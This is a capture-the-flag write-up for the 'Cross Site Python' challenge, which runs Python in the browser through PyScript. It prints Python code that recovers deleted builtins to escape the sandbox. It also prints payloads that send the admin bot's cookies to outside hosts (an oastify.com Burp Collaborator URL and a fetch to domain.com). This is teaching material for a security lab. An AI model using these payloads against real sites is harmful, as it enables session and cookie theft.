# Cross Site Python

The challenge provided the source code which is available in the `src` folder.

To run it locally, use the following command:
```
docker build -t cross-site-python . && docker run -p 5000:5000 cross-site-python
```

The application consisted of a small Flask backend and more importantly, a frontend that allows Python execution in the browser using [Pyscript](https://pyscript.net/) and [Pyodide](https://pyodide.org/en/stable/) as interpreter.

To complete the challenge, it was required to obtain the admin (bot) cookies, sending him a link to a page that it would visit later.

The page should execute a malicious Python frontend code that injects an XSS JS payload into the page. This JS payload would simply send the cookies back to the attacker.

## Analysis

One way to insert an XSS element inside the page is using the `js` `pyscript` library, which is a wrapper that allows accessing DOM elements from Python code.

However, attempting to import anything would return an error: _the `import` function itself was missing!_

**Payload**:
```
import js
```

**Output**:
```
Original exception was:
Traceback (most recent call last):
  File "/lib/python311.zip/_pyodide/_base.py", line 468, in eval_code
  File "/lib/python311.zip/_pyodide/_base.py", line 310, in run
  File "<exec>", line 3, in <module>
ImportError: __import__ not found
```

In fact, the challenge `pyscript` was modified by the author, deleting the `import` function and the `__loader__` variable from the Python scope.

**File**: pyjail.js:4215
```
    return await interpreter.run("del globals()['__loader__']\ndel __builtins__.__import__\n" + pysrc);
```

## An Over-Complicated Solution

At this point, I entered the rabbit hole, trying to understand if it was possible to import libraries without using the `import` function...   
Or to restore the original Python `__builtins__` variable...

Using the power of Google, I come across this old Reddit thread, describing how it was possible to restore the `__builtins__` variable after its deletion.
https://www.reddit.com/r/Python/comments/hftnp/ask_rpython_recovering_cleared_globals/

Some code was available but for old Python versions, while the application runs on Python 3.11!

Example code for Python 3.1 (untested):
```
lookup = lambda n: [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == n][0]
try:
    lookup('Codec')().decode('')
except lookup('BaseException') as e:
    del lookup
    __builtins__ = e.__traceback__.tb_next.tb_frame.f_globals['__builtins__']
```

However, searching deeper, I found a recent post (8 months old) with almost zero iteractions:
https://www.reddit.com/r/Python/comments/yaqoux/recovering_cleared_globals_and_builtins/

In particular, the user [Rawing7](https://www.reddit.com/user/Rawing7/) posted the following working code!
```
type = ''.__class__.__class__
ABCMeta = type.__subclasses__(type)[0]
abc_globals = ABCMeta.register.__globals__
_frozen_importlib_globals = type(abc_globals['__spec__']).__init__.__globals__
ModuleSpec = _frozen_importlib_globals['ModuleSpec']
BuiltinImporter = _frozen_importlib_globals['BuiltinImporter']
spec = ModuleSpec('builtins', BuiltinImporter, origin='built-in')
__builtins__ = BuiltinImporter.create_module(spec)

class ExceptionRestorer:
    def __enter__(self):
        return self
    
    def __exit__(self, exc_type, exc_value, traceback):
        queue = [exc_type.__base__.__base__.__base__]
        while queue:
            exc = queue.pop()
            if exc.__module__ == 'builtins':
                setattr(__builtins__, exc.__name__, exc)
                queue += exc.__subclasses__()
        
        __builtins__.IOError = OSError
        __builtins__.EnvironmentError = OSError
        __builtins__.WindowsError = OSError
        return True

with ExceptionRestorer():
    1/0

import io
__builtins__.open = io.open

import site
site.main()
```

Then, it was just a matter of importing the library and creating an image with a Burp Collaborator URL that exfiltrates the cookies.
```
import js
i = js.document.createElement("IMG")
i.src = "http://xxx.oastify.com?cookie=" + js.document.cookie
js.document.body.prepend(i)
```

Bingo!
```
GET /?cookie=flag=GPNCTF{4pp4r3ntly_pyth0n_1s_n0w_us3d_f0r_3v3ryth1ng_l2lIMU7mVOxawTvXBub} HTTP/1.1
Host: xxx.oastify.com
...
```

## A More Straightforward Solution
Turns out that my solution was overkill, it was also possible to find a reference to `js` library using just the following code:
```
js = sys.modules['pyscr' + 'ipt'].js
js.fetch("https://domain.com/flag?" + js.document.cookie)
```
_(credits to switch from the Discord CTF Channel)_